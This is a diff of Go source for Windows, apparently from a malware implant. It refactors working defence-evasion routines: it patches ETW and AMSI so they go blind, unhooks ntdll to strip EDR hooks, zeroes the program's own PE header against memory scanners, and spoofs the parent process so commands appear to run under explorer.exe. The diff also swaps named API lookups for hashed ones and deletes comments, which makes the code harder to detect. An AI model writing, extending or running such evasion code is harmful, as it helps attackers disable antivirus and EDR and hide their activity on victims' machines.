@@ -4,64 +4,35 @@ package main
 
 import (
 	"fmt"
-	"os"
 	"runtime"
 	"strings"
 	"syscall"
 	"unsafe"
 )
 
-var (
-	kernel32         = syscall.NewLazyDLL("kernel32.dll")
-	ntdll            = syscall.NewLazyDLL("ntdll.dll")
-	pVirtualProtect  = kernel32.NewProc("VirtualProtect")
-	pGetModuleHandle = kernel32.NewProc("GetModuleHandleW")
-	pGetProcAddress  = kernel32.NewProc("GetProcAddress")
-	pCreateFileW     = kernel32.NewProc("CreateFileW")
-	pCreateFileMapping = kernel32.NewProc("CreateFileMappingW")
-	pMapViewOfFile   = kernel32.NewProc("MapViewOfFile")
-	pUnmapViewOfFile = kernel32.NewProc("UnmapViewOfFile")
-	pCloseHandle     = kernel32.NewProc("CloseHandle")
-	pOpenProcess     = kernel32.NewProc("OpenProcess")
-
-	pCreateProcessW     = kernel32.NewProc("CreateProcessW")
-	pInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
-	pUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
-	pDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")
-
-	pNtProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")
-)
-
 const (
-	PAGE_EXECUTE_READWRITE = 0x40
-	PAGE_EXECUTE_READ      = 0x20
-	FILE_MAP_READ          = 0x04
-	GENERIC_READ           = 0x80000000
-	FILE_SHARE_READ        = 0x01
-	OPEN_EXISTING          = 3
-	SEC_IMAGE              = 0x1000000
-	PROCESS_ALL_ACCESS     = 0x001F0FFF
-	EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+	PAGE_EXECUTE_READWRITE             = 0x40
+	PAGE_EXECUTE_READ                  = 0x20
+	FILE_MAP_READ                      = 0x04
+	GENERIC_READ                       = 0x80000000
+	FILE_SHARE_READ                    = 0x01
+	OPEN_EXISTING                      = 3
+	SEC_IMAGE                          = 0x1000000
+	PROCESS_ALL_ACCESS                 = 0x001F0FFF
+	EXTENDED_STARTUPINFO_PRESENT       = 0x00080000
 	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
-	CREATE_NO_WINDOW       = 0x08000000
+	CREATE_NO_WINDOW                   = 0x08000000
 )
 
 func initWindowsEvasion() {
-	unhookNtdll()
-	initSyscallTable()
+	initResolvedProcs()
 	patchETWHardware()
 	patchAMSIHardware()
 	initSleepEncryption()
 }
 
-// patchETWInline patches EtwEventWrite with inline xor eax,eax;ret.
-// Simpler than hardware breakpoints; sufficient for Defender.
 func patchETWInline() {
-	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("ntdll.dll"))
-	if mod == 0 {
-		return
-	}
-	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWrite\x00")))
+	proc := getProc(mNtdll, fEtwEventWrite)
 	if proc == 0 {
 		return
 	}
@@ -73,19 +44,14 @@ func patchETWInline() {
 	}
 	writeMemory(proc, patch)
 
-	// Also patch EtwEventWriteEx
-	procEx, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWriteEx\x00")))
+	procEx := getProc(mNtdll, fEtwEventWriteEx)
 	if procEx != 0 {
 		writeMemory(procEx, patch)
 	}
 }
 
 func patchETWHardware() {
-	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("ntdll.dll"))
-	if mod == 0 {
-		return
-	}
-	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWrite\x00")))
+	proc := getProc(mNtdll, fEtwEventWrite)
 	if proc == 0 {
 		return
 	}
@@ -93,15 +59,14 @@ func patchETWHardware() {
 }
 
 func patchAMSIHardware() {
-	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("amsi.dll"))
+	mod := findMod(mAmsi)
 	if mod == 0 {
-		amsiDll, err := syscall.LoadDLL("amsi.dll")
-		if err != nil {
+		mod = loadMod(mAmsi)
+		if mod == 0 {
 			return
 		}
-		mod = uintptr(amsiDll.Handle)
 	}
-	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("AmsiScanBuffer\x00")))
+	proc := findExportByHash(mod, fAmsiScanBuffer)
 	if proc == 0 {
 		return
 	}
@@ -119,13 +84,12 @@ func setHardwareBreakpoint(addr uintptr, reg int) bool {
 }
 
 func setBreakpointCurrentThread() bool {
-	pGetCurrentThread := kernel32.NewProc("GetCurrentThread")
-	thread, _, _ := pGetCurrentThread.Call()
+	thread, _, _ := syscall.SyscallN(getProc(mKernel32, fGetCurrentThread))
 	var ctx CONTEXT
 	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL
 
-	pGetCtx := ntdll.NewProc("NtGetContextThread")
-	ret, _, _ := pGetCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
+	ntGetCtx := getProc(mNtdll, fNtGetContextThread)
+	ret, _, _ := syscall.SyscallN(ntGetCtx, thread, uintptr(unsafe.Pointer(&ctx)))
 	if ret != 0 {
 		return false
 	}
@@ -146,24 +110,23 @@ func setBreakpointCurrentThread() bool {
 		ctx.Dr7 &^= uint64(3 << (16 + bp.reg*4))
 	}
 
-	pSetCtx := ntdll.NewProc("NtSetContextThread")
-	ret, _, _ = pSetCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
+	ntSetCtx := getProc(mNtdll, fNtSetContextThread)
+	ret, _, _ = syscall.SyscallN(ntSetCtx, thread, uintptr(unsafe.Pointer(&ctx)))
 	return ret == 0
 }
 
 func clearDebugRegisters() {
-	pGetCurrentThread := kernel32.NewProc("GetCurrentThread")
-	thread, _, _ := pGetCurrentThread.Call()
+	thread, _, _ := syscall.SyscallN(getProc(mKernel32, fGetCurrentThread))
 	var ctx CONTEXT
 	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
-	pGetCtx := ntdll.NewProc("NtGetContextThread")
-	if ret, _, _ := pGetCtx.Call(thread, uintptr(unsafe.Pointer(&ctx))); ret != 0 {
+	ntGetCtx := getProc(mNtdll, fNtGetContextThread)
+	if ret, _, _ := syscall.SyscallN(ntGetCtx, thread, uintptr(unsafe.Pointer(&ctx))); ret != 0 {
 		return
 	}
 	ctx.Dr0, ctx.Dr1, ctx.Dr2, ctx.Dr3 = 0, 0, 0, 0
 	ctx.Dr6, ctx.Dr7 = 0, 0
-	pSetCtx := ntdll.NewProc("NtSetContextThread")
-	pSetCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
+	ntSetCtx := getProc(mNtdll, fNtSetContextThread)
+	syscall.SyscallN(ntSetCtx, thread, uintptr(unsafe.Pointer(&ctx)))
 }
 
 func refreshHardwareBreakpoints() {
@@ -173,8 +136,8 @@ func refreshHardwareBreakpoints() {
 }
 
 var (
-	hwbpTargets    = make(map[uintptr]uint64) // addr → return value
-	hwbpVEHOnce    bool
+	hwbpTargets     = make(map[uintptr]uint64)
+	hwbpVEHOnce     bool
 	hwbpBreakpoints []hwbpEntry
 )
 
@@ -188,8 +151,8 @@ func registerBreakpointHandler(addr uintptr, retVal uint64) {
 	hwbpTargets[addr] = retVal
 	if !hwbpVEHOnce {
 		hwbpVEHOnce = true
-		pAddVectoredExceptionHandler := kernel32.NewProc("AddVectoredExceptionHandler")
-		pAddVectoredExceptionHandler.Call(1, syscall.NewCallback(hwbpHandler))
+		addVEH := getProc(mKernel32, fAddVectoredExceptionHandler)
+		syscall.SyscallN(addVEH, 1, syscall.NewCallback(hwbpHandler))
 	}
 }
 
@@ -213,7 +176,6 @@ func hwbpHandler(info *EXCEPTION_POINTERS) uintptr {
 	return 0xFFFFFFFF
 }
 
-// CONTEXT for amd64 — debug registers
 type CONTEXT struct {
 	P1Home               uint64
 	P2Home               uint64
@@ -264,12 +226,12 @@ type CONTEXT struct {
 }
 
 type EXCEPTION_RECORD struct {
-	ExceptionCode    uint32
-	ExceptionFlags   uint32
-	ExceptionRecord  *EXCEPTION_RECORD
-	ExceptionAddress uintptr
-	NumberParameters uint32
-	_pad             uint32
+	ExceptionCode        uint32
+	ExceptionFlags       uint32
+	ExceptionRecord      *EXCEPTION_RECORD
+	ExceptionAddress     uintptr
+	NumberParameters     uint32
+	_pad                 uint32
 	ExceptionInformation [15]uintptr
 }
 
@@ -279,74 +241,55 @@ type EXCEPTION_POINTERS struct {
 }
 
 const (
-	EXCEPTION_SINGLE_STEP       = 0x80000004
-	CONTEXT_DEBUG_REGISTERS     = 0x00100010
-	CONTEXT_FULL                = 0x0010001F
+	EXCEPTION_SINGLE_STEP   = 0x80000004
+	CONTEXT_DEBUG_REGISTERS = 0x00100010
+	CONTEXT_FULL            = 0x0010001F
 )
 
-// stompPEHeader zeros out our own DOS and NT headers in memory.
-// This prevents memory scanners from identifying our PE structure.
 func stompPEHeader() {
-	mod, _, _ := pGetModuleHandle.Call(0)
+	mod, _, _ := syscall.SyscallN(rpGetModuleHandleW, 0)
 	if mod == 0 {
 		return
 	}
 
 	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(mod))
-	headerSize := uintptr(dosHeader.E_lfanew) + 264 // NT headers + some optional header
+	headerSize := uintptr(dosHeader.E_lfanew) + 264
 
 	var oldProtect uint32
-	pVirtualProtect.Call(mod, headerSize, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
+	syscall.SyscallN(rpVirtualProtect, mod, headerSize, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
 
-	// Zero out the headers
 	mem := unsafe.Slice((*byte)(unsafe.Pointer(mod)), headerSize)
 	for i := range mem {
 		mem[i] = 0
 	}
 
-	pVirtualProtect.Call(mod, headerSize, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+	syscall.SyscallN(rpVirtualProtect, mod, headerSize, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
 }
 
-// patchAMSI patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
-// This prevents Defender from scanning in-memory content from child processes.
 func patchAMSI() {
-	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("amsi.dll"))
-	if mod == 0 {
-		// AMSI not loaded yet — load it so we can patch before anything uses it
-		amsiDll, err := syscall.LoadDLL("amsi.dll")
-		if err != nil {
-			return
-		}
-		mod = uintptr(amsiDll.Handle)
-	}
-	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("AmsiScanBuffer\x00")))
+	proc := getProc(mAmsi, fAmsiScanBuffer)
 	if proc == 0 {
 		return
 	}
 
 	var patch []byte
 	if runtime.GOARCH == "amd64" {
-		// mov eax, 0x80070057 (E_INVALIDARG); ret
 		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
 	} else {
-		// mov eax, 0x80070057; ret 18h
 		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00}
 	}
 
 	writeMemory(proc, patch)
 }
 
-// unhookNtdll remaps a clean copy of ntdll.dll from disk over the hooked
-// in-memory copy. This removes any inline hooks placed by Defender/EDR.
 func unhookNtdll() {
-	sysroot := os.Getenv("SYSTEMROOT")
-	if sysroot == "" {
-		sysroot = `C:\Windows`
+	ntdllPath := findModPath(mNtdll)
+	if ntdllPath == "" {
+		return
 	}
-	ntdllPath := sysroot + `\System32\ntdll.dll`
 
 	pathW, _ := syscall.UTF16PtrFromString(ntdllPath)
-	hFile, _, _ := pCreateFileW.Call(
+	hFile, _, _ := syscall.SyscallN(rpCreateFileW,
 		uintptr(unsafe.Pointer(pathW)),
 		GENERIC_READ,
 		FILE_SHARE_READ,
@@ -357,36 +300,38 @@ func unhookNtdll() {
 	if hFile == uintptr(^uintptr(0)) {
 		return
 	}
-	defer pCloseHandle.Call(hFile)
+	defer syscall.SyscallN(rpCloseHandle, hFile)
 
-	hMapping, _, _ := pCreateFileMapping.Call(hFile, 0, SEC_IMAGE|syscall.PAGE_READONLY, 0, 0, 0)
+	hMapping, _, _ := syscall.SyscallN(rpCreateFileMappingW, hFile, 0, SEC_IMAGE|syscall.PAGE_READONLY, 0, 0, 0)
 	if hMapping == 0 {
 		return
 	}
-	defer pCloseHandle.Call(hMapping)
+	defer syscall.SyscallN(rpCloseHandle, hMapping)
 
-	cleanCopy, _, _ := pMapViewOfFile.Call(hMapping, FILE_MAP_READ, 0, 0, 0)
+	cleanCopy, _, _ := syscall.SyscallN(rpMapViewOfFile, hMapping, FILE_MAP_READ, 0, 0, 0)
 	if cleanCopy == 0 {
 		return
 	}
-	defer pUnmapViewOfFile.Call(cleanCopy)
+	defer syscall.SyscallN(rpUnmapViewOfFile, cleanCopy)
 
-	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
-	hookedBase, _, _ := pGetModuleHandle.Call(uintptr(unsafe.Pointer(ntdllName)))
+	hookedBase := findMod(mNtdll)
 	if hookedBase == 0 {
 		return
 	}
 
-	// Parse PE to find .text section and overwrite it
-	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(hookedBase))
-	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(hookedBase + uintptr(dosHeader.E_lfanew)))
-
-	sectionOffset := uintptr(unsafe.Sizeof(*ntHeaders))
-	if runtime.GOARCH == "amd64" {
-		sectionOffset = uintptr(dosHeader.E_lfanew) + 24 + uintptr(ntHeaders.OptionalHeaderSize)
-	} else {
-		sectionOffset = uintptr(dosHeader.E_lfanew) + 24 + uintptr(ntHeaders.OptionalHeaderSize)
+	// Verify architecture match between on-disk and in-memory
+	memDos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(hookedBase))
+	memNT := (*IMAGE_NT_HEADERS)(unsafe.Pointer(hookedBase + uintptr(memDos.E_lfanew)))
+	diskDos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(cleanCopy))
+	diskNT := (*IMAGE_NT_HEADERS)(unsafe.Pointer(cleanCopy + uintptr(diskDos.E_lfanew)))
+	if memNT.Machine != diskNT.Machine {
+		return
 	}
+
+	dosHeader := memDos
+	ntHeaders := memNT
+
+	sectionOffset := uintptr(dosHeader.E_lfanew) + 24 + uintptr(ntHeaders.OptionalHeaderSize)
 
 	for i := uint16(0); i < ntHeaders.NumberOfSections; i++ {
 		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(hookedBase + sectionOffset + uintptr(i)*40))
@@ -397,7 +342,7 @@ func unhookNtdll() {
 			addr := hookedBase + uintptr(section.VirtualAddress)
 			size := uintptr(section.VirtualSize)
 
-			pVirtualProtect.Call(addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
+			syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
 
 			cleanText := unsafe.Pointer(cleanCopy + uintptr(section.VirtualAddress))
 			copy(
@@ -405,13 +350,12 @@ func unhookNtdll() {
 				unsafe.Slice((*byte)(cleanText), size),
 			)
 
-			pVirtualProtect.Call(addr, size, PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+			syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 			break
 		}
 	}
 }
 
-// PE structures for parsing ntdll headers
 type IMAGE_DOS_HEADER struct {
 	E_magic  uint16
 	_pad     [28]uint16
@@ -419,14 +363,14 @@ type IMAGE_DOS_HEADER struct {
 }
 
 type IMAGE_NT_HEADERS struct {
-	Signature          uint32
-	Machine            uint16
-	NumberOfSections   uint16
-	TimeDateStamp      uint32
+	Signature            uint32
+	Machine              uint16
+	NumberOfSections     uint16
+	TimeDateStamp        uint32
 	PointerToSymbolTable uint32
-	NumberOfSymbols    uint32
-	OptionalHeaderSize uint16
-	Characteristics    uint16
+	NumberOfSymbols      uint32
+	OptionalHeaderSize   uint16
+	Characteristics      uint16
 }
 
 type IMAGE_SECTION_HEADER struct {
@@ -450,51 +394,39 @@ func sectionName(s *IMAGE_SECTION_HEADER) string {
 	return n
 }
 
-// writeMemory changes page protection, writes bytes, and restores protection.
 func writeMemory(addr uintptr, data []byte) {
 	var oldProtect uint32
 	size := uintptr(len(data))
-	pVirtualProtect.Call(addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
+	syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
 	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)
-	pVirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+	syscall.SyscallN(rpVirtualProtect, addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
 }
 
-func uintptrFromString(s string) uintptr {
-	p, _ := syscall.UTF16PtrFromString(s)
-	return uintptr(unsafe.Pointer(p))
-}
 
-func uintptrFromBytes(b []byte) uintptr {
-	return uintptr(unsafe.Pointer(&b[0]))
-}
-
-// ExecuteWithPPIDSpoof runs a command as a child of the specified parent PID.
-// This breaks the suspicious agent→cmd.exe parent-child chain that EDRs flag.
 func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
-	hParent, _, err := pOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(parentPID))
+	hParent, _, err := syscall.SyscallN(rpOpenProcess, PROCESS_ALL_ACCESS, 0, uintptr(parentPID))
 	if hParent == 0 {
 		return nil, fmt.Errorf("OpenProcess: %v", err)
 	}
-	defer pCloseHandle.Call(hParent)
+	defer syscall.SyscallN(rpCloseHandle, hParent)
 
-	// Initialize thread attribute list
 	var attrListSize uintptr
-	pInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
+	syscall.SyscallN(rpInitializeProcThreadAttributeList, 0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
 	if attrListSize == 0 {
 		return nil, fmt.Errorf("empty attribute list")
 	}
 	attrList := make([]byte, attrListSize)
 	attrListPtr := unsafe.Pointer(&attrList[0])
 
-	ret, _, err := pInitializeProcThreadAttributeList.Call(
+	ret, _, err := syscall.SyscallN(rpInitializeProcThreadAttributeList,
 		uintptr(attrListPtr), 1, 0, uintptr(unsafe.Pointer(&attrListSize)),
 	)
 	if ret == 0 {
 		return nil, fmt.Errorf("InitializeProcThreadAttributeList: %v", err)
 	}
-	defer pDeleteProcThreadAttributeList.Call(uintptr(attrListPtr))
+	defer syscall.SyscallN(rpDeleteProcThreadAttributeList, uintptr(attrListPtr))
 
-	ret, _, err = pUpdateProcThreadAttribute.Call(
+	ret, _, err = syscall.SyscallN(rpUpdateProcThreadAttribute,
 		uintptr(attrListPtr), 0,
 		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
 		uintptr(unsafe.Pointer(&hParent)), unsafe.Sizeof(hParent),
@@ -504,11 +436,10 @@ func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
 		return nil, fmt.Errorf("UpdateProcThreadAttribute: %v", err)
 	}
 
-	// Create pipe for stdout
 	var readPipe, writePipe syscall.Handle
 	sa := syscall.SecurityAttributes{
-		Length:             uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
-		InheritHandle:     1,
+		Length:        uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
+		InheritHandle: 1,
 	}
 	if err := syscall.CreatePipe(&readPipe, &writePipe, &sa, 0); err != nil {
 		return nil, err
@@ -530,7 +461,7 @@ func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
 	si.AttributeList = attrListPtr
 
 	var pi syscall.ProcessInformation
-	ret, _, err = pCreateProcessW.Call(
+	ret, _, err = syscall.SyscallN(rpCreateProcessW,
 		0,
 		uintptr(unsafe.Pointer(cmdLine)),
 		0, 0, 1,
@@ -547,7 +478,6 @@ func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
 	syscall.CloseHandle(writePipe)
 	syscall.CloseHandle(pi.Thread)
 
-	// Read output
 	var output []byte
 	buf := make([]byte, 4096)
 	for {
@@ -565,8 +495,6 @@ func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
 	return output, nil
 }
 
-// enumerateProcessNames returns all running process names via
-// CreateToolhelp32Snapshot — no cmd.exe spawned.
 func enumerateProcessNames() []string {
 	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
@@ -587,7 +515,6 @@ func enumerateProcessNames() []string {
 	return names
 }
 
-// findProcessPID returns the PID of a process by name.
 func findProcessPID(target string) uint32 {
 	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
@@ -609,7 +536,6 @@ func findProcessPID(target string) uint32 {
 	return 0
 }
 
-// findExplorerPID returns the PID of explorer.exe for parent spoofing.
 func findExplorerPID() uint32 {
 	return findProcessPID("explorer.exe")
 }
